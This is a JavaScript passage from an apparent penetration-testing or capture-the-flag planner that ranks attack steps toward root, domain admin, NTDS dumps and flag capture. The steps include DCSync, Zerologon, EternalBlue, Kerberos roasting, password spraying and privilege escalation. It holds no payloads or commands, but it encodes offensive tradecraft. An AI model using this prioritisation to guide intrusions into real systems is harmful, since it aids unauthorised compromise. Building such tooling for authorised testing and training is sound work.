  var V2_GOALS_NO_FLAGS = ['access.admin', 'access.system', 'access.root', 'loot.ntds'];
  // Keystone weighting (gate-wiring aware): `enable` already rewards the single BEST door a move opens
  // (Math.max over newly-unlocked moves). Keystone adds the BREADTH - how many currently-blocked moves a
  // move's produced facts unblock, goal-tempered - so a pivotal fact (credential.available unblocks the whole
  // authenticated surface; loot.ntds unblocks the endgame) is favoured over a narrow lead of equal
  // goal-distance, WITHOUT a hand-tuned priority bump. Kept small + capped: a refinement that breaks ties
  // toward the keystone, never a term that overrides a clearly-better-progress move. Tune against the corpus.
  var V2_KEYSTONE_W = 0.15;    // weight of the breadth term in the score
  var V2_KEYSTONE_CAP = 4;     // max accumulated breadth before the weight applies (bounds its influence)
  // Endgame objective pull. Goal-distance is MIN-over-goals, so the moment ONE objective is met (you grab the
  // user flag - objective.local_flag is a goal) the distance collapses to 0 and every move, including the
  // still-open ROOT/proof-flag capture, reads zero progress - the two-flag split would otherwise let
  // enumeration/pivot keystone bury the flag you came to capture. This pull gives any move that DIRECTLY
  // produces an as-yet-uncaptured objective.*flag a strong, bounded bonus so the reachable flag leads. It is a
  // within-tier score term (never changes the tier), so a genuinely fresher/higher-tier lead still wins - it
  // decides "what now that I CAN grab a flag", not "ignore a fresh keystone to grab one".
  var V2_OBJECTIVE_RE = /^objective\.(flag|local_flag|root_flag)$/;
  var V2_OBJECTIVE_W = 3;      // bonus for a move that captures an unmet objective flag (beats typical keystone)
  // Specific EARNED control/loot/credential facts: a move gated on one of these is a deterministic
  // cash-in (DCSync given control paths, a crack given a hash), not a gamble - full reliability.
  var V2_SPECIFIC = {
    'ad.control_paths': 1, 'ad.gpo_control': 1, 'ad.gpo_writable': 1, 'hash.krbtgt': 1,
    'hash.asrep': 1, 'hash.tgs': 1, 'hash.ntlm': 1, 'loot.ntds': 1, 'ad.zerologon': 1,
    'adcs.vulnerable': 1, 'credential.certificate': 1, 'ad.sid_history': 1, 'ad.coerced_auth': 1,
    'ad.unconstrained': 1, 'privesc.sudo_rights': 1, 'privesc.windows_privilege': 1,
    'privesc.suid_candidate': 1, 'privesc.cron': 1, 'privesc.cron_writable': 1, 'privesc.capabilities': 1,
    'privesc.capability': 1, 'privesc.sudo_binary': 1, 'privesc.passwd_writable': 1, 'privesc.nfs_no_root_squash': 1,
    'privesc.process_lead': 1, 'privesc.script_sink': 1, 'privesc.dll_hijack_candidate': 1, 'privesc.stored_credentials': 1, 'privesc.patch_gap': 1,
    'privesc.weak_service_permission': 1, 'privesc.scheduled_task': 1, 'privesc.unquoted_service_path': 1,
    'privesc.always_install_elevated': 1, 'privesc.autorun': 1, 'privesc.lxd_group': 1, 'privesc.docker_group': 1,
    'db.session': 1, 'ad.gmsa': 1, 'kerberos.tickets': 1, 'smb.ms17_010': 1, 'hash.mscache': 1,
    'vuln.dirtycow': 1, 'vuln.dirtypipe': 1, 'vuln.baron_samedit': 1, 'vuln.polkit': 1,
    'vuln.jdwp': 1, 'vuln.screen_suid': 1, 'vuln.chkrootkit': 1,
    'privesc.custom_binary': 1, 'privesc.path_hijack_candidate': 1, 'privesc.library_or_script_hijack': 1,
    'ftp.anon_write': 1, 'ftp.authenticated': 1,
    'smb.writable_share': 1, 'access.admin_share': 1, 'share.users_readable': 1,
    'ad.laps': 1, 'ad.rbcd': 1, 'ad.delegation': 1, 'ad.group_joined': 1, 'ad.domain_control': 1,
    'privesc.kernel_exploit': 1,
    'ad.nopac': 1, 'vuln.printnightmare': 1, 'ad.maq_allow': 1,
    'mssql.sysadmin': 1, 'hash.sntp': 1, 'loot.keepass_dump': 1,
    'hash.crackable': 1, 'privesc.writable_etc': 1, 'privesc.suid': 1, 'smb.smbv1': 1,
    'service.web_terminal': 1,
  };
  var V2_PRIV = { 'access.admin': 1, 'access.system': 1, 'access.root': 1, 'loot.ntds': 1, 'objective.flag': 1, 'objective.local_flag': 1, 'objective.root_flag': 1 };
  // An exploit/foothold move is EVIDENCED (not a bare-port gamble) when the box actually shows a
  // reason to run it: a proven vulnerability fingerprint, a credential/hash in hand, an existing
  // foothold/access to escalate from, looted material, or an earned privesc/kerberos/ADCS primitive.
  // A move that lands a foothold but is eligible only because a port/service is open - with none of
  // these held - is a "try if vulnerable" gamble and must not outrank the evidenced next step
  // (same discipline already applied to coerce/relay/check moves). EternalBlue is the model: it
  // requires its smb.ms17_010 NSE verdict, so it is evidenced, never a bare-445 guess.
  var V2_EVIDENCE_RE = /^(vuln\.|credential\.|hash\.|access\.|foothold\.|loot\.|privesc\.|kerberos\.|adcs\.)/;
  // Concrete AD primitives a collection/enumeration PROVED (a BloodHound attack path, an ACL lead, a
  // delegation right, a trust) - abusing one is an evidenced move, not a bare-port guess. (The earned
  // control/loot facts like ad.control_paths/ad.gpo_control are already in V2_SPECIFIC.)
  var V2_AD_LEAD = { 'ad.attack_paths': 1, 'ad.acl_lead': 1, 'ad.delegation': 1, 'ad.trusts': 1 };
  var V2_FOOTHOLD = { 'foothold.linux': 1, 'foothold.windows': 1, 'foothold.webshell': 1, 'access.shell': 1, 'access.admin': 1, 'access.system': 1, 'access.root': 1 };
  // Evidence = something you PROVED (a vuln verdict, a credential, a hash, a foothold, a control lead) -
  // never a mere "service reachable" recon fact. kerberos.reachable matched /^kerberos\./ and so was wrongly
  // treated as evidence, which let blind password-spray look "indicated" (reliable) and headline over the
  // deterministic AS-REP roast. A reachable port proves nothing about a credential or a vuln.
  // A `*_confirmed` fact is a PROVEN vulnerability verdict (web.sqli_confirmed, web.cmdi_confirmed, …) - the
  // same class of evidence as a vuln.* fingerprint, so a move gated on one is evidenced, not a bare-port
  // gamble. Without this a confirmed SQLi left sqlmap-automation capped as speculative, below weaker leads.
  function v2EvidenceFact(g) { if (/\.reachable$/.test(g)) return false; return !!V2_SPECIFIC[g] || !!V2_AD_LEAD[g] || V2_EVIDENCE_RE.test(g) || /_confirmed$/.test(g); }
  var _v2ActionMetaCache = typeof WeakMap === 'function' ? new WeakMap() : null;
  function v2GetActionMeta(a) {
    var prod = a.produces || [], ra = a.requires_all || [], ry = a.requires_any || [], cmds = a.commands || [];
    var sigLen = (prod.length << 16) ^ (ra.length << 8) ^ ry.length ^ (cmds.length << 24);
    var canCache = !!(_v2ActionMetaCache && a && typeof a === 'object');
    var m = canCache ? _v2ActionMetaCache.get(a) : null;
    if (m && m.sigLen === sigLen && m.locus === a.locus && m.aid === a.id) return m;
    var adviceOnly = prod.length > 0;
    var isObjectiveFlagOnly = prod.length > 0;
    var alwaysSpecProd = false, producesFoothold = false, producesCred = false, producesPriv = false, i, k;
    var primaryPk = [];
    for (i = 0; i < prod.length; i++) {
      k = prod[i];
      if (adviceOnly && !/^advice\./.test(k)) adviceOnly = false;
      if (isObjectiveFlagOnly && !/^(?:objective\.(?:flag|local_flag|root_flag)|proof\.captured)$/.test(k)) isObjectiveFlagOnly = false;
      if (!AUX_PRODUCED_RE.test(k)) primaryPk.push(k);
      if (k === 'exploit.candidate' || k === 'ad.coerced_auth' || k === 'credential.netntlm') alwaysSpecProd = true;
      if (V2_FOOTHOLD[k] || /_confirmed$/.test(k)) producesFoothold = true;
      if (k === 'credential.available' || k === 'credential.plaintext') producesCred = true;
      if (V2_PRIV[k]) producesPriv = true;
    }
    var settledPk = primaryPk.length ? primaryPk : prod;
    var onlyGenericMulti = true, onlyGenericCred = true;
    for (i = 0; i < settledPk.length; i++) {
      if (!GENERIC_MULTI_KINDS[settledPk[i]]) onlyGenericMulti = false;
      if (!GENERIC_CRED_ONLY_KINDS[settledPk[i]]) onlyGenericCred = false;
    }
    var earnedGates = [], evidenceGates = [];
    var reqAllCtx = new Array(ra.length), reqAnyCtx = new Array(ry.length);
    var hasCtxGate = false, reqHasFoot = false, reqHasAdmin = false;
    var aid = String(a.id || '');
    var isCrackMove = ((aid.indexOf('crack-') === 0 && aid !== 'crack-identify' && aid !== 'crack-hash-troubleshoot') || aid === 'hashcat' || aid === 'john');
    var reqHashes = isCrackMove ? [] : _V2_EMPTY_I32;
    var reqHasTgs = false, reqHasAsrep = false;
    for (i = 0; i < ra.length; i++) {
      k = ra[i];
      if (V2_SPECIFIC[k] || /^vuln\./.test(k)) earnedGates.push(k);
      if (v2EvidenceFact(k)) evidenceGates.push(k);
      var ctxA = CONTEXT_SENSITIVE_KIND_RE.test(k);
      reqAllCtx[i] = ctxA;
      if (ctxA) hasCtxGate = true;
      if (k === 'foothold.linux' || k === 'foothold.windows') reqHasFoot = true;
      if (k === 'access.admin' || k === 'access.system' || k === 'access.root') reqHasAdmin = true;
      if (isCrackMove && (k.indexOf('hash.') === 0 || k === 'credential.netntlm' || k === 'db.hashes' || k === 'loot.shadow' || k === 'loot.material')) {
        reqHashes.push(k);
        if (k === 'hash.tgs') reqHasTgs = true;
        if (k === 'hash.asrep') reqHasAsrep = true;
      }
    }
    for (i = 0; i < ry.length; i++) {
      k = ry[i];
      if (V2_SPECIFIC[k] || /^vuln\./.test(k)) earnedGates.push(k);
      if (v2EvidenceFact(k)) evidenceGates.push(k);
      var ctxY = CONTEXT_SENSITIVE_KIND_RE.test(k);
      reqAnyCtx[i] = ctxY;
      if (ctxY) hasCtxGate = true;
      if (k === 'foothold.linux' || k === 'foothold.windows') reqHasFoot = true;
      if (k === 'access.admin' || k === 'access.system' || k === 'access.root') reqHasAdmin = true;
      if (isCrackMove && (k.indexOf('hash.') === 0 || k === 'credential.netntlm' || k === 'db.hashes' || k === 'loot.shadow' || k === 'loot.material')) {
        reqHashes.push(k);
        if (k === 'hash.tgs') reqHasTgs = true;
        if (k === 'hash.asrep') reqHasAsrep = true;
      }
    }
    var cmdPrefixes = [], cmdPrefixWildcard = false;
    var cmdList = cmds.length ? cmds : [{ run: a.web_command || a.command || '' }];
    for (i = 0; i < cmdList.length; i++) {
      var rawCmd = String((cmdList[i] && (cmdList[i].web || cmdList[i].run)) || a.web_command || a.command || '').trim();
      if (!rawCmd) continue;
      var w0 = rawCmd.split(/\s+/)[0].replace(/^['"]+|['"]+$/g, '').toLowerCase();
      if (!w0 || w0.indexOf('<') >= 0 || w0.indexOf('{') >= 0 || w0.indexOf('$') >= 0) {
        cmdPrefixWildcard = true;
        break;
      }
      if (cmdPrefixes.indexOf(w0) < 0) cmdPrefixes.push(w0);
    }
    m = {
      sigLen: sigLen,
      aid: a.id,
      locus: a.locus,
      locusCost: locusRank(a.locus) * 0.3,
      adviceOnly: adviceOnly,
      isObjectiveFlagOnly: isObjectiveFlagOnly,
      hasPrimaryPk: primaryPk.length > 0,
      settledPk: settledPk,
      onlyGenericMulti: onlyGenericMulti,
      onlyGenericCred: onlyGenericCred,
      alwaysSpecProd: alwaysSpecProd,
      producesFoothold: producesFoothold,
      producesCred: producesCred,
      producesPriv: producesPriv,
      earnedGates: earnedGates,
      evidenceGates: evidenceGates,
      reqAllCtx: reqAllCtx,
      reqAnyCtx: reqAnyCtx,
      hasCtxGate: hasCtxGate,
      reqHasFoot: reqHasFoot,
      reqHasAdmin: reqHasAdmin,
      isCrackMove: isCrackMove,
      reqHashes: reqHashes,
      reqHasTgs: reqHasTgs,
      reqHasAsrep: reqHasAsrep,
      cmdPrefixes: cmdPrefixes,
      cmdPrefixWildcard: cmdPrefixWildcard
    };
    if (canCache) _v2ActionMetaCache.set(a, m);
    return m;
  }
  function v2ProducesFoothold(a) { return v2GetActionMeta(a).producesFoothold; }
  function v2Earned(a, haveObj) {
    if (!haveObj) return false;
    if (a.id === 'linux-kernel-exploit') return !!haveObj['privesc.kernel_exploit'];
    if (a.id === 'baron-samedit') return !!(haveObj['vuln.baron_samedit'] || haveObj['privesc.kernel_exploit']);
    if ((a.id === 'bloodyad-acl' || a.id === 'ad-acl-abuse') && (haveObj['ad.attack_paths'] || haveObj['ad.acl_lead'] || haveObj['ad.control_paths'])) return true;
    var gates = v2GetActionMeta(a).earnedGates;
    for (var i = 0; i < gates.length; i++) if (haveObj[gates[i]]) return true;
    return false;
  }
  function v2Indicated(a, haveObj) {
    if (!haveObj) return false;
    if (a.id === 'linux-kernel-exploit' && haveObj['privesc.kernel_exploit']) return true;
    var g = v2GetActionMeta(a).evidenceGates;
    for (var i = 0; i < g.length; i++) if (haveObj[g[i]]) return true;
    return false;
  }

  function v2Speculative(a, haveObj) {
    // A guidance/troubleshooter move produces only advice.* - it mints no attack fact, so it can never
    // be a "try-if-vulnerable" gamble. Exempt it before the id-regex/payoff checks (otherwise a doctor
    // whose id merely contains "relay"/"responder"/"check" would be wrongly capped below everything).
    var meta = v2GetActionMeta(a);
    if (meta.adviceOnly) return false;
    if (a.speculative || meta.alwaysSpecProd) return true;
    // A move that claims a real PAYOFF - a foothold/privilege, or a VALIDATED credential - while eligible
    // without any proven indicator (a fingerprint, a held credential/hash, a foothold) is a gamble: blind
    // password spraying or default-cred guessing against a bare user list, or firing an exploit at an open
    // port. Cap it below evidenced moves so the deterministic path (AS-REP roast, crack a captured hash)
    // leads. Once you actually hold material to work with, the move is indicated and promotes normally.
    if (haveObj && (meta.producesFoothold || meta.producesCred) && !v2Indicated(a, haveObj)) {
      return true;
    }
    return false;
  }
  // Minimal steps from a set of held fact-kinds to any goal, through the produce/require graph:
  // AND over a move's requirements, OR over a fact's producers. Memoized, cycle-guarded.
  // Compiled once per `producers` map via WeakMap into contiguous CSR integer arrays so repeated
  // calls in nextActionsV2 and planPath perform zero object allocations and zero property deletes.
  var _v2GraphCache = typeof WeakMap === 'function' ? new WeakMap() : null;
  var _V2_EMPTY_I32 = typeof Int32Array === 'function' ? new Int32Array(0) : [];
  function v2AllocI32(n) {
    if (typeof Int32Array === 'function') return new Int32Array(n);
    var a = new Array(n); for (var i = 0; i < n; i++) a[i] = 0; return a;
  }
  function v2AllocU8(n) {
    if (typeof Uint8Array === 'function') return new Uint8Array(n);
    var a = new Array(n); for (var i = 0; i < n; i++) a[i] = 0; return a;
  }
  function v2FillArr(arr, val) {
    if (typeof arr.fill === 'function') { arr.fill(val); return; }
    for (var i = 0; i < arr.length; i++) arr[i] = val;
  }
  function v2CopyArr(dst, src) {
    if (typeof dst.set === 'function') { dst.set(src); return; }
    for (var i = 0; i < src.length; i++) dst[i] = src[i];
  }
  function v2CompileGraph(producers) {
    var factId = Object.create(null), F = 0;
    function internFact(k) {
      var id = factId[k];
      if (id === undefined) { id = F++; factId[k] = id; }
      return id;
    }
    var gi;
    for (gi = 0; gi < V2_GOALS.length; gi++) internFact(V2_GOALS[gi]);
    for (gi = 0; gi < V2_GOALS_NO_FLAGS.length; gi++) internFact(V2_GOALS_NO_FLAGS[gi]);

    var moveObjMap = typeof Map === 'function' ? new Map() : null;
    var moveIdMap = Object.create(null), U = 0, M = 0;
    var prodTemp = [], reqAllTemp = [], reqAnyTemp = [], moveMemoIdArr = [];
    var totalProd = 0, totalReqAll = 0, totalReqAny = 0;
    var pKeys = producers ? Object.keys(producers) : [];
    for (var pk = 0; pk < pKeys.length; pk++) {
      var fk = pKeys[pk], ms = producers[fk];
      if (!ms || !ms.length) continue;
      var fId = internFact(fk);
      var mList = new Array(ms.length);
      totalProd += ms.length;
      for (var i = 0; i < ms.length; i++) {
        var m = ms[i];
        var u = moveObjMap ? moveObjMap.get(m) : undefined;
        if (u === undefined) {
          u = U++;
          if (moveObjMap) moveObjMap.set(m, u);
          var midKey = String(m.id);
          var mid = moveIdMap[midKey];
          if (mid === undefined) { mid = M++; moveIdMap[midKey] = mid; }
          moveMemoIdArr[u] = mid;
          var ra = m.requires_all || [], raIds = new Array(ra.length), j;
          for (j = 0; j < ra.length; j++) raIds[j] = internFact(ra[j]);
          reqAllTemp[u] = raIds;
          totalReqAll += ra.length;
          var ry = m.requires_any || [], ryIds = new Array(ry.length);
          for (j = 0; j < ry.length; j++) ryIds[j] = internFact(ry[j]);
          reqAnyTemp[u] = ryIds;
          totalReqAny += ry.length;
        }
        mList[i] = u;
      }
      prodTemp[fId] = mList;
    }

    var prodOff = v2AllocI32(F + 1), prodFlat = v2AllocI32(totalProd), pCur = 0;
    var initMemoF = v2AllocI32(F);
    for (var fi = 0; fi < F; fi++) {
      prodOff[fi] = pCur;
      var pl = prodTemp[fi];
      if (pl && pl.length) {
        for (var pli = 0; pli < pl.length; pli++) prodFlat[pCur++] = pl[pli];
        initMemoF[fi] = -1;
      } else {
        initMemoF[fi] = V2_INF;
      }
    }
    prodOff[F] = pCur;

    var reqAllOff = v2AllocI32(U + 1), reqAllFlat = v2AllocI32(totalReqAll), raCur = 0;
    var reqAnyOff = v2AllocI32(U + 1), reqAnyFlat = v2AllocI32(totalReqAny), ryCur = 0;
    var moveMemoId = v2AllocI32(U);
    for (var ui = 0; ui < U; ui++) {
      moveMemoId[ui] = moveMemoIdArr[ui];
      reqAllOff[ui] = raCur;
      var ral = reqAllTemp[ui];
      for (var rali = 0; rali < ral.length; rali++) reqAllFlat[raCur++] = ral[rali];
      reqAnyOff[ui] = ryCur;
      var ryl = reqAnyTemp[ui];
      for (var ryli = 0; ryli < ryl.length; ryli++) reqAnyFlat[ryCur++] = ryl[ryli];
    }
    reqAllOff[U] = raCur;
    reqAnyOff[U] = ryCur;

    var memoF = v2AllocI32(F);
    var memoM = v2AllocI32(M);
    var stack = v2AllocU8(F);

    function fc(fId) {
      var mf = memoF[fId];
      if (mf !== -1) return mf;
      if (stack[fId]) return V2_INF;
      stack[fId] = 1;
      var best = V2_INF, s = prodOff[fId], e = prodOff[fId + 1];
      for (var i = s; i < e; i++) {
        var u = prodFlat[i], c = memoM[moveMemoId[u]];
        if (c === -1) c = mc(u);
        if (c < best) best = c;
      }
      stack[fId] = 0;
      memoF[fId] = best;
      return best;
    }
    function mc(u) {
      var mid = moveMemoId[u];
      var mm = memoM[mid];
      if (mm !== -1) return mm;
      var c = 1, j, as = reqAllOff[u], ae = reqAllOff[u + 1];
      for (j = as; j < ae; j++) {
        var rId = reqAllFlat[j], rv = memoF[rId];
        c += (rv !== -1 ? rv : fc(rId));
      }
      var ys = reqAnyOff[u], ye = reqAnyOff[u + 1];
      if (ys < ye) {
        var mn = V2_INF;
        for (j = ys; j < ye; j++) {
          var yId = reqAnyFlat[j], v = memoF[yId];
          if (v === -1) v = fc(yId);
          if (v < mn) mn = v;
        }
        c += mn;
      }
      if (c > V2_INF) c = V2_INF;
      memoM[mid] = c;
      return c;
    }

    return {
      F: F,
      factId: factId,
      prodOff: prodOff,
      prodFlat: prodFlat,
      reqAllOff: reqAllOff,
      reqAllFlat: reqAllFlat,
      reqAnyOff: reqAnyOff,
      reqAnyFlat: reqAnyFlat,
      initMemoF: initMemoF,
      memoF: memoF,
      memoM: memoM,
      fc: fc
    };
  }
  function v2GetGraph(producers) {
    var canCache = !!(_v2GraphCache && producers && typeof producers === 'object');
    var G = canCache ? _v2GraphCache.get(producers) : null;
    if (!G) {
      G = v2CompileGraph(producers);
      if (canCache) _v2GraphCache.set(producers, G);
    }
    return G;
  }
  var _v2PackBundleCache = typeof WeakMap === 'function' ? new WeakMap() : null;
  function v2BuildProducers(list) {
    var p = {};
    for (var i = 0; i < list.length; i++) {
      var a = list[i], pr = a.produces;
      for (var j = 0; j < pr.length; j++) {
        var k = pr[j];
        var arr = p[k];
        if (!arr) p[k] = [a];
        else arr.push(a);
      }
    }
    return p;
  }
  function v2GetPackBundle(pack, noFlags) {
    var len = pack ? pack.length : 0;
    var first = len ? pack[0] : null;
    var last = len ? pack[len - 1] : null;
    var canCache = !!(_v2PackBundleCache && pack && typeof pack === 'object');
    var entry = canCache ? _v2PackBundleCache.get(pack) : null;
    if (!entry || entry.len !== len || entry.first !== first || entry.last !== last) {
      entry = { len: len, first: first, last: last, all: null, noFlags: null };
      if (canCache) _v2PackBundleCache.set(pack, entry);
    }
    if (noFlags) {
      if (!entry.noFlags) {
        var apNf = pack.filter(function (a) { return !isFlagHuntAction(a); });
        entry.noFlags = { activePack: apNf, producers: v2BuildProducers(apNf) };
      }
      return entry.noFlags;
    }
    if (!entry.all) {
      entry.all = { activePack: pack, producers: v2BuildProducers(pack) };
    }
    return entry.all;
  }
  function v2GoalDistance(haveObj, producers, goals) {
    var goalList = goals || V2_GOALS;
    var gLen = goalList.length, g;
    for (g = 0; g < gLen; g++) {
      if (haveObj[goalList[g]]) return 0;
    }
    var G = v2GetGraph(producers);
    var memoF = G.memoF, memoM = G.memoM, factId = G.factId, fc = G.fc;
    v2CopyArr(memoF, G.initMemoF);
    v2FillArr(memoM, -1);
    for (var hk in haveObj) {
      if (haveObj[hk]) {
        var hid = factId[hk];
        if (hid !== undefined) memoF[hid] = 0;
      }
    }
    var d = V2_INF;
    for (g = 0; g < gLen; g++) {
      var gId = factId[goalList[g]];
      if (gId !== undefined) {
        var gd = fc(gId);
        if (gd < d) d = gd;
      }
    }
    return d;
  }
  function v2GoalDistanceDelta(G, baseMemoF, extraA, extraB, goalSet, goalIds) {
    var i, k, fid;
    for (i = 0; i < extraA.length; i++) {
      if (goalSet[extraA[i]]) return 0;
    }
    if (extraB) {
      for (i = 0; i < extraB.length; i++) {
        if (goalSet[extraB[i]]) return 0;
      }
    }
    var memoF = G.memoF, memoM = G.memoM, factId = G.factId, fc = G.fc;
    v2CopyArr(memoF, baseMemoF);
    v2FillArr(memoM, -1);
    for (i = 0; i < extraA.length; i++) {
      fid = factId[extraA[i]];
      if (fid !== undefined) memoF[fid] = 0;
    }
    if (extraB) {
      for (i = 0; i < extraB.length; i++) {
        fid = factId[extraB[i]];
        if (fid !== undefined) memoF[fid] = 0;
      }
    }
    var d = V2_INF, gLen = goalIds.length;
    for (var g = 0; g < gLen; g++) {
      var gId = goalIds[g];
      if (gId !== -1) {
        var gd = fc(gId);
        if (gd < d) d = gd;
      }
    }
    return d;
  }
  function v2GoalDistanceBits(G, bits, W, bitToFactId, goalBits, goalFactIds) {
    var w;
    for (w = 0; w < W; w++) {
      if ((bits[w] & goalBits[w]) !== 0) return 0;
    }
    var memoF = G.memoF, memoM = G.memoM, fc = G.fc;
    v2CopyArr(memoF, G.initMemoF);
    v2FillArr(memoM, -1);
    for (w = 0; w < W; w++) {
      var word = bits[w];
      var base = w << 5;
      while (word !== 0) {
        var lsb = word & -word;
        var fid = bitToFactId[base + (31 - Math.clz32(lsb))];
        if (fid !== -1) memoF[fid] = 0;
        word ^= lsb;
      }
    }
    var d = V2_INF, gLen = goalFactIds.length;
    for (var g = 0; g < gLen; g++) {
      var gId = goalFactIds[g];
      if (gId !== -1) {
        var gd = fc(gId);
        if (gd < d) d = gd;
      }
    }
    return d;
  }
  function v2ProgressFrom(d0, haveObj, produces, producers, goals) {
    var h2 = {}, k;
    for (k in haveObj) h2[k] = 1;
    for (var i = 0; i < produces.length; i++) h2[produces[i]] = 1;
    var d1 = v2GoalDistance(h2, producers, goals);
    if (d0 >= V2_INF) return d1 >= V2_INF ? 0 : 5;
    return Math.max(0, d0 - d1);
  }
  function v2EligAgainst(a, kindsObj) {
    var i, ra = a.requires_all;
    for (i = 0; i < ra.length; i++) {
      var rk = ra[i];
      if (!kindsObj[rk]) {
        if (rk === 'http.reachable' && hasActionReqKind(a, function (k) { return !!kindsObj[k]; }, rk)) continue;
        return false;
      }
    }
    var ry = a.requires_any;
    if (ry.length) {
      var any = false;
      for (i = 0; i < ry.length; i++) if (kindsObj[ry[i]]) { any = true; break; }
      if (!any) return false;
    }
    return true;
  }
  function v2Reliability(a, haveObj) {
    if (v2Earned(a, haveObj)) return 1.0;
    if (v2Speculative(a, haveObj)) return 0.25;
    if (v2GetActionMeta(a).producesPriv) return 0.3;
    return 0.8;
  }
  // Recency: the fact-kinds from the operator's latest ingest batch (within 2s of the newest fact),
  // and the set proven before it. opts.recentKinds / opts.beforeKinds override (tests / known deltas).
  function v2Recency(facts, opts) {
    if (opts && opts.recentKinds) return { recent: opts.recentKinds, before: opts.beforeKinds || {} };
    var SUPP = OBOL.facts.ProofState.SUPPORTED, maxT = 0, i, f;
    for (i = 0; i < facts.facts.length; i++) { f = facts.facts[i]; if (f.state === SUPP && f.created_at > maxT) maxT = f.created_at; }
    // "latest batch" = facts minted within ~2s of the newest. created_at is seconds in the live app
    // (facts.makeFact uses Date.now()/1000) but milliseconds in tests/fixtures, so size the window to
    // the unit - otherwise a 2000-in-seconds window spans ~33 min and the whole session reads as
    // "recent", which collapses the recency tier and lets raw priority surface noise.
    var win = maxT > 1e12 ? 2000 : 2;
    var cut = maxT - win, recent = {}, before = {};
    for (i = 0; i < facts.facts.length; i++) {
      f = facts.facts[i];
      if (f.state !== SUPP) continue;
      if (f.created_at >= cut) recent[f.kind] = 1; else before[f.kind] = 1;
    }
    // Two-step Nmap opening unification: when the operator runs `nmap -p-` (minting port:* and *.reachable)
    // and then runs `nmap -sC -sV` (minting scan.nmap.version), `earlyRecon` held back service enumeration
    // until `scan.nmap.version` completed. Fold the opening port/service reachability facts into `recent`
    // so completing the version scan unlocks the full initial enumeration frontier instead of only moves
    // gated on `scan.nmap.version` / `ad.domain_known` / `host.fqdn`.
    if (recent['scan.nmap.version'] && !before['scan.nmap.version'] && !before['credential.available'] && !before['foothold.linux'] && !before['foothold.windows'] && !before['access.shell']) {
      for (var bk in before) {
        if (/^port:|^ports\.|^service\.|\.reachable$|^ad\.dc_candidate$|^host\.|^scan\.nmap\.quick$/.test(bk)) {
          recent[bk] = 1;
          delete before[bk];
        }
      }
    }
    return { recent: recent, before: before };
  }

  function accessEpoch(facts) {
    if (!facts) return 'anon';
    var hasFact = function (k) {
      if (typeof facts.has === 'function') return facts.has(k);
      if (facts.facts && Array.isArray(facts.facts)) {
        return facts.facts.some(function (f) { return f.kind === k && f.state !== 'refuted' && f.state !== 'inconclusive'; });
      }
      if (Array.isArray(facts)) {
        return facts.some(function (f) { return (f.kind || f) === k; });
      }
      return !!facts[k];
    };
    var getValues = function (k) {
      if (typeof facts.values === 'function') return facts.values(k) || [];
      if (facts.facts && Array.isArray(facts.facts)) {
        var out = [];
        facts.facts.forEach(function (f) {
          if (f.kind === k && f.state !== 'refuted' && f.state !== 'inconclusive' && f.value) out.push(f.value);
        });
        return out;
      }
      return [];
    };

    var adminVal = hasFact('access.root') ? 'root'
      : (hasFact('access.system') ? 'system'
      : (hasFact('access.admin') ? 'admin'
      : ''));

    var fhVal = hasFact('foothold.windows') ? 'win'
      : (hasFact('foothold.linux') ? 'lin'
      : (hasFact('access.shell') ? 'shell' : ''));
    if (fhVal === 'lin' || fhVal === 'win') {
      var fhUsersMap = Object.create(null);
      ['foothold.linux', 'foothold.windows'].forEach(function (fk) {
        getValues(fk).forEach(function (fv) {
          if (!fv) return;
          var fu = String(fv.user || fv.identity || fv.username || '').replace(/^.*[\\/]/, '').split('@')[0].trim().toLowerCase();
          if (fu && !/^(?:root|administrator|system|nt authority\\system)$/.test(fu)) fhUsersMap[fu] = 1;
        });
      });
      var fhUserList = Object.keys(fhUsersMap).sort();
      if (fhUserList.length >= 2) fhVal += ':' + fhUserList.join(',');
    }

    var credMap = {};
    ['credential.available', 'credential.validated', 'credential.plaintext'].forEach(function (k) {
      var vals = getValues(k);
      vals.forEach(function (v) {
        if (!v) return;
        var u = String(v.user || v.username || '').toLowerCase().trim();
        if (!u) return;
        var hasPw = !!(v.password || v.secret);
        var hasHash = !!(v.nthash || v.hash || v.ntlm);
        var secType = (hasPw && hasHash) ? 'both' : (hasPw ? 'pw' : (hasHash ? 'hash' : 'id'));
        var records = (facts.facts || []).filter(function (f) { return f.kind === k && f.value === v; });
        var scope = records.length ? records[0].scope : '';
        var id = OBOL.facts.credentialIdentity(v, scope);
        credMap[u + ':' + secType + ':' + id] = true;
      });
    });

    var credUsers = Object.keys(credMap).sort();

    var openHashes = [];
    if (hasFact('hash.asrep')) openHashes.push('asrep');
    if (hasFact('hash.tgs')) openHashes.push('tgs');
    if (hasFact('hash.ntlm')) openHashes.push('ntlm');
    if (hasFact('hash.crackable')) openHashes.push('crackable');

    if (!adminVal && !fhVal && credUsers.length === 0 && openHashes.length === 0) {
      return 'anon';
    }

    var parts = [];
    if (adminVal) parts.push('adm:' + adminVal);
    if (fhVal) parts.push('fh:' + fhVal);
    if (credUsers.length > 0) parts.push('cred:' + credUsers.join(','));
    if (openHashes.length > 0) parts.push('h:' + openHashes.join(','));

    return parts.join('|') || 'anon';
  }

  function nextActionsV2(facts, pack, opts) {
    opts = opts || {};
    var doneIds = opts.doneIds || {}, focus = opts.focusPrefixes || [];
    var noFlags = !!(opts.noFlags || opts.flagsEnabled === false);
    var goals = opts.goals || (noFlags ? V2_GOALS_NO_FLAGS : V2_GOALS);
    var bundle = v2GetPackBundle(pack, noFlags);
    var activePack = bundle.activePack;
    var producers = bundle.producers;
    var rMemo = getResolvedFactsMemo(facts);
    var haveObj = rMemo ? rMemo.have : facts.kinds();
    var fam = rMemo ? rMemo.fam : hostOsFamily(facts);
    var live = [];
    for (var _li = 0; _li < activePack.length; _li++) {
      var _la = activePack[_li];
      if (!doneIds[_la.id] && _la.eligible(facts, haveObj, fam) && !_la.settled(facts, haveObj) && !_la.obsolete(facts, haveObj)) {
        live.push(_la);
      }
    }
    var rec = v2Recency(facts, opts);
    var activeGoals = goals.filter(function (g) { return !haveObj[g]; });
    if (!activeGoals.length) activeGoals = goals;
    var d0 = v2GoalDistance(haveObj, producers, activeGoals);
    var availCredVals = (typeof facts.values === 'function') ? (facts.values('credential.available') || []) : [];
    var onlySpeculativeCrossDomainCred = !!(haveObj['credential.available'] && !haveObj['credential.validated']
      && !haveObj['smb.authenticated'] && !haveObj['ldap.authenticated'] && !haveObj['winrm.authenticated'] && !haveObj['ssh.authenticated']
      && availCredVals.length > 0 && availCredVals.every(function (v) { return !!(v && v.speculativeCrossDomainReuse); }));
    // "Orient before exploit" applies only at the OPENING: you have run a port scan but not yet the thorough
